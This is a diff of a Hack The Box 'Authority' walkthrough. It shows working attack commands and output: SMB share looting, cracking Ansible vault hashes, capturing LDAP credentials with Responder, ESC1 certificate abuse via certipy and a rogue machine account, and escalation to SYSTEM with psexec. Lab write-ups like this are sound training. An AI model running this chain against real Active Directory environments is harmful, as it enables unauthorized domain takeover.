@@ -19,6 +19,7 @@ So, we added a fake computer to the domain and used it to request a certificate 
 Starting with `nmap`. `nmap` finds a lot of open ports.
 
 ```bash
+
 $nmap 10.10.11.222 -oN authority-allports.nmap
 
 Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-07-03 09:34 CDT
@@ -45,6 +46,7 @@ Nmap done: 1 IP address (1 host up) scanned in 617.75 seconds
 ```
 
 ```bash
+
 $nmap -sC -sV -p 53,80,88,135,139,389,445,464,593,636,3268,3269,8443 -oN authority-service.nmap 10.10.11.222
 Nmap scan report for 10.10.11.222
 Host is up (0.088s latency).
@@ -166,6 +168,7 @@ Host script results:
 |_    Message signing enabled and required
 
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+
 ```
 
 ### /etc/hosts
@@ -203,6 +206,7 @@ Clicking on any of the tab Configuration Manager and Configuration Editor, it pr
 Using smbmap we can see that we have access to the Development share.
 
 ```bash
+
 smbmap -H 10.10.11.222 -u 'anonymous' -p ''
 [+] Guest session   	IP: 10.10.11.222:445	Name: authority.htb                                     
         Disk                                                  	Permissions	Comment
@@ -214,12 +218,14 @@ smbmap -H 10.10.11.222 -u 'anonymous' -p ''
 	IPC$                                              	READ ONLY	Remote IPC
 	NETLOGON                                          	NO ACCESS	Logon server share 
 	SYSVOL                                            	NO ACCESS	Logon server share 
+
 ```
 
 ### Smbclient
 Now, we will use smbclinet will null authentication to view and download all the files locally.
 
 ```bash
+
 $smbclient -N //10.10.11.222/Development 
 Try "help" to get a list of possible commands.
 smb: \> dir
@@ -232,6 +238,7 @@ smb: \> prompt no
 smb: \> mget *
 getting file \Automation\Ansible\ADCS\.ansible-lint of size 259 as Automation/Ansible/ADCS/.ansible-lint (0.9 KiloBytes/sec) (average 0.9 KiloBytes/sec)
 <SNIP>
+
 ```
 
 ## Shell as svc_ldap
@@ -243,7 +250,8 @@ We have downloaded a folder called Automation which contains Anisble files.
 
 Under Ansible > PWM > defaults > main.yml we can see some credentials.
 
-```yml
+```yaml
+
 pwm_run_dir: "{{ lookup('env', 'PWD') }}"
 
 pwm_hostname: authority.htb.corp
@@ -278,12 +286,14 @@ ldap_admin_password: !vault |
           34646237336164356438383034623462323531316333623135383134656263663266653938333334
           3238343230333633350a646664396565633037333431626163306531336336326665316430613566
           3764
+
 ```
 
 ### Credentials Recovery
 The values in the file are protected by Ansible vault. We can use ansible2john which takes a file with two lines one header and other the hex-encoded value. First we need to format the protected values in the files.
 
 ```bash
+
 $cat ldap_admin_password 
 $ANSIBLE_VAULT;1.1;AES256
 633038313035343032663564623737313935613133633130383761663365366662326264616536303437333035366235613437373733316635313530326639330a643034623530623439616136363563346462373361643564383830346234623235313163336231353831346562636632666539383333343238343230333633350a6466643965656330373334316261633065313363363266653164306135663764
@@ -299,10 +309,12 @@ $ANSIBLE_VAULT;1.1;AES256
 ```
 
 ```bash
+
 $ansible2john ldap_admin_password pwm_admin_login pwm_admin_password | tee ansible_hashes
 ldap_admin_password:$ansible$0*0*c08105402f5db77195a13c1087af3e6fb2bdae60473056b5a477731f51502f93*dfd9eec07341bac0e13c62fe1d0a5f7d*d04b50b49aa665c4db73ad5d8804b4b2511c3b15814ebcf2fe98334284203635
 pwm_admin_login:$ansible$0*0*2fe48d56e7e16f71c18abd22085f39f4fb11a2b9a456cf4b72ec825fc5b9809d*e041732f9243ba0484f582d9cb20e148*4d1741fd34446a95e647c3fb4a4f9e4400eae9dd25d734abba49403c42bc2cd8
 pwm_admin_password:$ansible$0*0*15c849c20c74562a25c925c3e5a4abafd392c77635abc2ddc827ba0a1037e9d5*1dff07007e7a25e438e94de3f3e605e1*66cb125164f19fb8ed22809393b1767055a66deae678f4a8b1f8550905f70da5
+
 ```
 
 ### Hashcat
@@ -310,6 +322,7 @@ pwm_admin_password:$ansible$0*0*15c849c20c74562a25c925c3e5a4abafd392c77635abc2dd
 Now, we can use hashcat to crack all the hashes.
 
 ```bash
+
 $hashcat ansible_hashes /usr/share/wordlists/rockyou.txt --user
 
 $ansible$0*0*15c849c20c74562a25c925c3e5a4abafd392c77635abc2ddc827ba0a1037e9d5*1dff07007e7a25e438e94de3f3e605e1*66cb125164f19fb8ed22809393b1767055a66deae678f4a8b1f8550905f70da5:!@#$%^&*
@@ -319,6 +332,7 @@ $ansible$0*0*c08105402f5db77195a13c1087af3e6fb2bdae60473056b5a477731f51502f93*df
 ```
 
 ```bash
+
 $cat ldap_admin_password | ansible-vault decrypt
 Vault password: 
 Decryption successful
@@ -333,6 +347,7 @@ $cat pwm_admin_password | ansible-vault decrypt
 Vault password: 
 Decryption successful
 pWm_@dm!N_!23
+
 ```
 
 ### PWN Access
@@ -359,13 +374,12 @@ We can now use reponder to grab the ldap credentials. We will open responder and
 
 `$sudo responder -I tun0`
 
-<SNIP>
-
 ![](/assets/Hackthebox/Authority/image-9.png)
 
 Once we configure LDAP url to our interface and click on test LDAP profile, we can get the LDAP credentials in clear text.
 
 ```bash
+
 [LDAP] Cleartext Client   : 10.10.11.222
 [LDAP] Cleartext Username : CN=svc_ldap,OU=Service Accounts,OU=CORP,DC=authority,DC=htb
 [LDAP] Cleartext Password : lDaP_1n_th3_cle4r!
@@ -374,6 +388,7 @@ Once we configure LDAP url to our interface and click on test LDAP profile, we c
 using netexec winrm we can test the credentials and we can see that we can get shell acess as svc_ldap.
 
 ```bash
+
 $netexec winrm 10.10.11.222 -u svc_ldap -p 'lDaP_1n_th3_cle4r!'
 WINRM       10.10.11.222    5985   AUTHORITY        [*] Windows 10 / Server 2019 Build 17763 (name:AUTHORITY) (domain:authority.htb)
 WINRM       10.10.11.222    5985   AUTHORITY        [+] authority.htb\svc_ldap:lDaP_1n_th3_cle4r! (Pwn3d!)
@@ -383,8 +398,10 @@ WINRM       10.10.11.222    5985   AUTHORITY        [+] authority.htb\svc_ldap:l
 We got shell as svs_ldap using evil-winrm.
 
 ```bash
+
 $evil-winrm -i 10.10.11.222 -u svc_ldap -p 'lDaP_1n_th3_cle4r!'
 *Evil-WinRM* PS C:\Users\svc_ldap>
+
 ```
 
 ## Shell as Administrator
@@ -394,6 +411,7 @@ $evil-winrm -i 10.10.11.222 -u svc_ldap -p 'lDaP_1n_th3_cle4r!'
 We will use `certipy` on our attacker machine to enumerate ADCS. We can use find command to identify templates and use -vunlerable option to only show the vulnerables ones.
 
 ```bash
+
 certipy find -dc-ip 10.10.11.222  -u svc_ldap -p 'lDaP_1n_th3_cle4r!' -stdout -vulnerable
 Certipy v4.8.2 - by Oliver Lyak (ly4k)
 
@@ -476,7 +494,9 @@ Certificate Templates
                                           AUTHORITY.HTB\Administrator
     [!] Vulnerabilities
       ESC1                              : 'AUTHORITY.HTB\\Domain Computers' can enroll, enrollee supplies subject and template allows client authentication
+
 ```
+
 It identifies a template `CorpVPN` and this is vulnerable to `ESC1`.
 
 According to this [post](https://www.blackhillsinfosec.com/abusing-active-directory-certificate-services-part-one/). Templates vulnerable to `ESC1` must have the following configurations:
@@ -493,23 +513,29 @@ The settings that allows a user to add a computer to domain is the
 ms-ds-machineaccountquota. We can use `netexec` to view the machinequota. 
 
 ```bash
+
 $netexec ldap 10.10.11.222 -u svc_ldap -p 'lDaP_1n_th3_cle4r!' -M maq
 SMB         10.10.11.222    445    AUTHORITY        [*] Windows 10 / Server 2019 Build 17763 x64 (name:AUTHORITY) (domain:authority.htb) (signing:True) (SMBv1:False)
 LDAPS       10.10.11.222    636    AUTHORITY        [+] authority.htb\svc_ldap:lDaP_1n_th3_cle4r! 
 MAQ         10.10.11.222    389    AUTHORITY        [*] Getting the MachineAccountQuota
 MAQ         10.10.11.222    389    AUTHORITY        MachineAccountQuota: 10
+
 ```
+
 This means we can add upto 10 computers. We can add computers using `impacket-addcomputer`.
 
 ```bash
+
 $impacket-addcomputer Authority.htb/svc_ldap:'lDaP_1n_th3_cle4r!' -computer-name testerpc -computer-pass 'Password@123' -method LDAPS -dc-ip 10.10.11.222
 Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
 
 [*] Successfully added machine account testerpc$ with password Password@123.
+
 ```
 With the computer account created earlier, certipy will create a certificate.
 
 ```bash
+
 $certipy req -username testerpc$ -password Password@123 -ca AUTHORITY-CA -dc-ip 10.10.11.222 -template CorpVPN -upn administrator@authority.htb -dns authority.htb
 Certipy v4.8.2 - by Oliver Lyak (ly4k)
 
@@ -521,6 +547,7 @@ Certipy v4.8.2 - by Oliver Lyak (ly4k)
     DNS Host Name: 'authority.htb'
 [*] Certificate has no object SID
 [*] Saved certificate and private key to 'administrator_authority.pfx'
+
 ```
 
 
@@ -560,11 +587,13 @@ add_user_to_group user group - Adds a user to a group.
 
 # add_user_to_group svc_ldap administrators
 Adding user: svc_ldap to group Administrators result: OK
+
 ```
 
 svc-ldap has been added to the administrator group. We can use psexec to confim that we can login as administrator.
 
 ```bash
+
 impacket-psexec authority.htb/svc_ldap:'lDaP_1n_th3_cle4r!'@10.10.11.222 
 Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
 
@@ -580,4 +609,5 @@ Microsoft Windows [Version 10.0.17763.4644]
 
 C:\Windows\system32> whoami
 nt authority\system
+
 ```
